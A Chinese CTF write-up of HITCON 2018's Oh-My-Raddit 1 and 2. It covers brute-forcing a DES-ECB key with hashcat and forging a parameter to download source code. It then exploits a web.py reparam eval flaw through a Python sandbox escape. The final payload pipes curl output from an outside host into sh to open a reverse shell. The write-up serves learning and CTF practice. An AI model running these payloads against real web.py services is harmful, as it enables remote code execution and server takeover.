---
title: hitcon2018受虐笔记二:Oh-My-Raddit-1-and-2学习
url: 729.html
id: 729
categories:
  - hack_ctf
date: 2018-10-25 19:23:21
tags:
    - ctf 
    - hitcon2018
    - python
---

之前在web中题目中也有很多次遇到密码学的问题，但大多数都是已知了加密部分的代码，也就是已知了加密算法和加密模式，攻击目的一般是泄露密钥，或者伪造明文或者泄露明文。攻击方法常用的有CBC反转， padding oracle，hash长度扩展攻击，重放攻击等。但是像这一次的唯密文攻击的，还真是第一次遇到，所以就有点无从下手，主要还是密码学的知识太匮乏了。

<!--more-->

下面是看了别人的writeup之后，又顺着当时自己的做题思路，继续学习的过程。

### Oh-My-Raddit-1 学习笔记

题目中的链接是这样的：

```html
<td><a href="?s=8c762b8f22036dbbdda56facf732ffa71c3a372e4530241246449a55e25888cf98164f49a25f54a84ea0640e3adaf107cc67c8f2e688e8adf18895d89bfae58e33ae2e67609b509afb0e52f2f8b2145e">50 million Facebook accounts owned</a></td>
```

点击之后就会发生一次303跳转，跳转到一个地址：

```
https://newsroom.fb.com/news/2018/09/security-update/
```

所以猜想s参数可能跟最终跳转的url之间存在某种关系，可能是url的加密值。于是把所有的s参数值和url的值都抓取下来，并且统计长度用逗号隔开,存为csv文件，如下显示:

```html
密文,密文长度,url长度,url

8c762b8f22036dbbdda56facf732ffa71c3a372e4530241246449a55e25888cf98164f49a25f54a84ea0640e3adaf107cc67c8f2e688e8adf18895d89bfae58e33ae2e67609b509afb0e52f2f8b2145e,160,53,https://newsroom.fb.com/news/2018/09/security-update/

b8cefd6eb48eb05a2a6455031697145597fd94cc1ddf5de9d1ced9f3ba9f0671294f7e621271724379f8866765581ed27a11fbf32a65c9c5fa555e936059c30ae7e0574415898d59825eaf40b8ca4b6b4c495604c766de6410158def0234ca52d3a472f56cbc6007a2be6b76d1489fb1d1968e7d8d19f94970b8924776e4aad7fe36cd98ce5e1381db456c31e215b5bf3ca92540eb2d0a42,304,117,https://blog.netlab.360.com/70-different-types-of-home-routers-all-together-100000-are-being-hijacked-by-ghostdns-en/

68935751c61b2cbf9b23a8a310cc25357d90e8ec90d21429132b8e6a7069a3af361b3d849b06b5cc92f33f42305f794b7551f5397ba46a5b452ab65a472ac6415e697a86b2b618a9c9cf94ea64cd49b2b2780d3cf5b55c51b70a9a2903fb58e786a4d5c5dc412819,208,73,https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part1.html

....
```

看到下面两条数据：

```
8c762b8f22036dbbdda56facf732ffa71c3a372e4530241246449a55e25888cf98164f49a25f54a84ea0640e3adaf107cc67c8f2e688e8adf18895d89bfae58e33ae2e67609b509afb0e52f2f8b2145e,160,53,https://newsroom.fb.com/news/2018/09/security-update/

a164de5c0574559c7181f4ff4ee6693c8740afb01d3c8d6f1c5bc1d931bb57cf2d17cbc566279d6f51fdf7c38111ee10602ad1a9467cb0db9d80eb3c9a5ff4b33674c613d436ac902241ce2f5d5ab0825a6bdd41073fb6e31202b4fcd3e2dc08b0ec4469e20ff376,208,53,https://www.securifera.com/blog/2018/10/07/servicefu/
```

两条数据的url长度相同，但是密文长度却相差很多，这就说明了密文可能并不仅仅是对url进行加密的结果。

而可能是对url和其他一些内容的加密`ciphertext=encrypt(url+something)`

**仔细观察密文，可以发现密文都是16的倍数，因为密文都是16进制，所以密文长度应该都是8 bytes的倍数，于是可以猜测出此加密算法是分组加密，分组长度是8 bytes。**

下面我又进行了另外一个实验，我从密文的第一位开始，每次只修改密文一位的值，看解密后是否能够成功跳转到原来的url地址，代码如下：

```python
import requests
import copy 
randStr = '0123456789abcdef'
host = "http://13.115.255.46/?s="
url = list('1a969e9e7488c391428ca12b3a2280f83389d6fdd40c68c29f085cacc2c7a7cc2fb7465584101c689b2058ce85aa3606dfd91fd183144892b1d39e0b730702448ca6ac0be7436e2409c5f576db0d26341afd7a398b0473de743dbdc5d810ebde3282d9a673ace6d23054124f8c79aa420bb0032c89336b1bd9d51086fba2caafaee2b8b4568118b5999b89fb35cb2fe24c181b95a8281a7b')

for i in range(0,len(url)):
    print("[-] "+str(i))
    for j in randStr:
        tmp = copy.deepcopy(url)
        tmp[i] = j
        realUrl = host + ''.join(tmp)
        res = requests.get(realUrl,allow_redirects=False)
        if res.status_code == 303:
            if tmp != url:
                print("[+] "+str(i)+":"+realUrl)
            else:
                pass
        elif res.status_code==500:
            print("[+] "+str(i)+":"+res.text)
```

运行之后，发现：

```
[-] 95
[-] 96
[+] 96:http://13.115.255.46/?s=1a969e9e7488c391428ca12b3a2280f83389d6fdd40c68c29f085cacc2c7a7cc2fb7465584101c689b2058ce85aa36060fd91fd183144892b1d39e0b730702448ca6ac0be7436e2409c5f576db0d26341afd7a398b0473de743dbdc5d810ebde3282d9a673ace6d23054124f8c79aa420bb0032c89336b1bd9d51086fba2caafaee2b8b4568118b5999b89fb35cb2fe24c181b95a8281a7b
[+] 96:http://13.115.255.46/?s=1a969e9e7488c391428ca12b3a2280f83389d6fdd40c68c29f085cacc2c7a7cc2fb7465584101c689b2058ce85aa36061fd91fd183144892b1d39e0b730702448ca6ac0be7436e2409c5f576db0d26341afd7a398b0473de743dbdc5d810ebde3282d9a673ace6d23054124f8c79aa420bb0032c89336b1bd9d51086fba2caafaee2b8b4568118b5999b89fb35cb2fe24c181b95a8281a7b
[+] 96:http://13.115.255.46/?s=1a969e9e7488c391428ca12b3a2280f83389d6fdd40c68c29f085cacc2c7a7cc2fb7465584101c689b2058ce85aa36062fd91fd183144892b1d39e0b730702448ca6ac0be7436e2409c5f576db0d26341afd7a398b0473de743dbdc5d810ebde3282d9a673ace6d23054124f8c79aa420bb0032c89336b1bd9d51086fba2caafaee2b8b4568118b5999b89fb35cb2fe24c181b95a8281a7b
```

所以的密文都是对96位之后的部分进行修改，都能成功的解密出来url地址，96位之前的任意一位进行修改都会导致无法解密出来正确的url。

**这个结果可以告诉我们两个信息，第一：密文的前96位跟url相关。第二：密文的分组之间是没有依赖关系的(如果有依赖关系的话，对前面的部分进行修改，必然会导致密文整体解密失败，不会出现大片的解密成功的情况)。**

根据第一个信息，不定长的url被处理成了定长的密文，那么最容易想到的方式就是padding，但是很多url的长度是大于48 bytes的(密文长度)，所以应该不是padding。那很有可能加密的仅仅是一个定长的url ID值，然后在数据库中查出相对应的url地址。

根据第二个信息，因为是分组加密，并且分组之间是没有传导性的依赖关系，所以可以猜想加密模式是最简单的ECB了。

常用的分组加密也不过是DES和AES，但是AES最短的分组长度是128bits,所以常见的64bites分组的加密也只有是DES了。 所以猜想加密算法可能是DES-ECB。

又因为题目中的提示，说明密钥是小写的字母[a-z]：

```
assert ENCRYPTION_KEY.islower()
```

又因为DES加密中，长度为64bits的密钥其实只有56位参与了DES运算（第8、16、24、32、40、48、56、64位是校验位），所以密钥的每个字母的二进制都要去掉最低位，所以密钥中出现的b和c在舍弃最低位之后其实是等价的。

```python
In [4]: bin(ord('b'))
Out[4]: '0b1100010'

In [5]: bin(ord('c'))
Out[5]: '0b1100011'
```

所以密钥是在`abdfhjlnprtvxz`中选出8个，爆破空间是`14**8`,只要我们找到一组密文和明文的对应，就可以爆破出来密钥了。

将所有的明文都8 bytes个一组进行分开，发现多个明文的末尾都出现了`3ca92540eb2d0a42`,猜想这可能是DES的padding`\x08\x08\x08\x08\x08\x08\x08\x08`的加密结果。

然后尝试爆破这对明密文对（自己写的python程序太慢了，哎...）：

```python
hashcat -m 14000 3ca92540eb2d0a42:0808080808080808 -a 3 -1 acegikmoqsuwy ?1?1?1?1?1?1?1?1 --force
```

最后爆破出来的密钥是`ldgonaro`，根据出题人的提示，需要获取到题目源码。

又发现链接：

```
<a href="?s=2e7e305f2da018a2cf8208fa1fefc238522c932a276554e5f8085ba33f9600b301c3c95652a912b0342653ddcdc4703e5975bd2ff6cc8a133ca92540eb2d0a42">down</a>
```

可以下载一个pdf文件，于是利用上面的密钥解密这条数据：

```python
from Crypto.Cipher import DES
ENCRPYTION_KEY = 'ldgonaro'
def decrypt(s):
    try:
        data = s.decode('hex')
        cipher = DES.new(ENCRPYTION_KEY, DES.MODE_ECB)

        data = cipher.decrypt(data)
        print(data)
    except Exception as e:
        print e.message
        return {}

decrypt('2e7e305f2da018a2cf8208fa1fefc238522c932a276554e5f8085ba33f9600b301c3c95652a912b0342653ddcdc4703e5975bd2ff6cc8a133ca92540eb2d0a42')
# 得到数据
# m=d&f=uploads%2F70c97cc1-079f-4d01-8798-f36925ec1fd7.pdf
```

于是猜想这里可能是个任意文件下载，然后加密数据`m=d&f=app.py`：

```python
from Crypto.Cipher import DES
ENCRPYTION_KEY = 'ldgonaro'

def encrypt(s):
    length = DES.block_size - (len(s) % DES.block_size)
    s = s + chr(length)*length

    cipher = DES.new(ENCRPYTION_KEY, DES.MODE_ECB)
    return cipher.encrypt(s).encode('hex')

print(encrypt('m=d&f=app.py'))

#e2272b36277c708bc21066647bc214b8
```

访问`http://13.115.255.46/?s=e2272b36277c708bc21066647bc214b8`成功获取到题目源码。源码中有密钥。



###  Oh-My-Raddit-2 学习笔记

题目提示需要getshell,拿到代码就可以代码审计了。

主要是利用了web.py的一个任意代码执行的漏洞，参考链接[https://securityetalii.es/2014/11/08/remote-code-execution-in-web-py-framework/](https://securityetalii.es/2014/11/08/remote-code-execution-in-web-py-framework/)，下面自己的分析一下这个漏洞的成因。

漏洞主要存在web.py框架的db.py文件中：

代码如下：

```python
def reparam(string_, dictionary): 
    """
    Takes a string and a dictionary and interpolates the string
    using values from the dictionary. Returns an `SQLQuery` for the result.

        >>> reparam("s = $s", dict(s=True))
        <sql: "s = 't'">
        >>> reparam("s IN $s", dict(s=[1, 2]))
        <sql: 's IN (1, 2)'>
    """
    dictionary = dictionary.copy() # eval mucks with it
    # disable builtins to avoid risk for remote code exection.
    dictionary['__builtins__'] = object()
    vals = []
    result = []
    for live, chunk in _interpolate(string_):
        if live:
            v = eval(chunk, dictionary)
            result.append(sqlquote(v))
        else: 
            result.append(chunk)
    return SQLQuery.join(result, '')
```

```python
def _interpolate(format): 
    """
    Takes a format string and returns a list of 2-tuples of the form
    (boolean, string) where boolean says whether string should be evaled
    or not.

    from <http://lfw.org/python/Itpl.py> (public domain, Ka-Ping Yee)
    """
    from tokenize import tokenprog

    def matchorfail(text, pos):
        match = tokenprog.match(text, pos)
        if match is None:
            raise _ItplError(text, pos)
        return match, match.end()

    namechars = "abcdefghijklmnopqrstuvwxyz" \
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_";
    chunks = []
    pos = 0

    while 1:
        dollar = format.find("$", pos)
        if dollar < 0: 
            break
        nextchar = format[dollar + 1]

        if nextchar == "{":
            chunks.append((0, format[pos:dollar]))
            pos, level = dollar + 2, 1
            while level:
                match, pos = matchorfail(format, pos)
                tstart, tend = match.regs[3]
                token = format[tstart:tend]
                if token == "{": 
                    level = level + 1
                elif token == "}":  
                    level = level - 1
            chunks.append((1, format[dollar + 2:pos - 1]))

        elif nextchar in namechars:
            chunks.append((0, format[pos:dollar]))
            match, pos = matchorfail(format, dollar + 1)
            while pos < len(format):
                if format[pos] == "." and \
                    pos + 1 < len(format) and format[pos + 1] in namechars:
                    match, pos = matchorfail(format, pos + 1)
                elif format[pos] in "([":
                    pos, level = pos + 1, 1
                    while level:
                        match, pos = matchorfail(format, pos)
                        tstart, tend = match.regs[3]
                        token = format[tstart:tend]
                        if token[0] in "([": 
                            level = level + 1
                        elif token[0] in ")]":  
                            level = level - 1
                else: 
                    break
            chunks.append((1, format[dollar + 1:pos]))
        else:
            chunks.append((0, format[pos:dollar + 1]))
            pos = dollar + 1 + (nextchar == "$")

    if pos < len(format): 
        chunks.append((0, format[pos:]))
    return chunks
```

函数_interpolate的目的就是为了把格式化的sql语句例如:`a= ${s} and b= $s`变为为一个list

`[(0, 'a= '), (1, 's'), (0, ' and b= '), (1, 's')]`，然后通过eval函数来获取后面dictionary定义的命名空间中变量的值：

```python
for live, chunk in _interpolate(string_):
    if live:
        v = eval(chunk, dictionary) # dictionary = {"s":"test"}
        result.append(sqlquote(v))
    else: 
        result.append(chunk)
```

只看上面的代码，任意代码执行，非常简单了：

```python
In [16]: eval("__import__('os').getcwd()",{'s':"test"})
Out[16]: '/Volumes/data/ctf/2018hitcon/oh_my_raddit'
```

但是上面有一个操作：

```
# disable builtins to avoid risk for remote code exection.
 dictionary['__builtins__'] = object()
```

把dictionary命名空间中的内建模块给替换掉了，所以导致`__import__`找不到了。

```python
In [28]: a["__builtins__"] = object()

In [29]: eval("__import__('os').getcwd()",a)
---------------------------------------------------------------------------
NameError                                 Traceback (most recent call last)
<ipython-input-29-47f22339b750> in <module>()
----> 1 eval("__import__('os').getcwd()",a)

<string> in <module>()

NameError: name '__import__' is not defined
```

但是这个很显然可以通过绕过没有内建模块的python沙箱的方法绕过这个限制:

```python
eval("[item for item in [].__class__.__bases__[0].__subclasses__() if item.__name__=='catch_warnings' ][0]()._module.__builtins__['__import__']('os').system('pwd')",a)
```

payload如下：

```python
print(reparam("a=${[item for item in [].__class__.__bases__[0].__subclasses__() if item.__name__=='catch_warnings' ][0]()._module.__builtins__['__import__']('os').system('pwd')}",dict(s='test')))
```

看一下app.py的代码`method="p"`的时候：

```python
elif method == 'p':
    limit = s.get('l')
    return web.template.frender('templates/index.html')(get_posts(limit), get_urls())
```

```python
def get_posts(limit=None):
    records = []
    for i in db.select('posts', limit=limit, order='ups desc'):
        tmp = {
            'm': 'r', 
            't': i.title.encode('utf-8', 'ignore'), 
            'u': i.id, 
        } 
        tmp['param'] = encrypt(urllib.urlencode(tmp))
        tmp['ups'] = i.ups
        if i.file:
            tmp['file'] = encrypt(urllib.urlencode({'m': 'd', 'f': i.file}))
        else:
            tmp['file'] = ''
        
        records.append( tmp )
    return records
```

看到get_posts函数执行了db.select操作，把用户的limit参数带入了`reparam`函数，造成任意代码执行。

所以构造数据,就可以任意代码执行了,反弹shell，拿到flag:

```
"m=p&l=${[item for item in [].__class__.__bases__[0].__subclasses__() if item.__name__=='catch_warnings' ][0]()._module.__builtins__['__import__']('os').system('curl http://wonderkun.cc:3000/wonderkun.cc:8888|sh')}'}"
```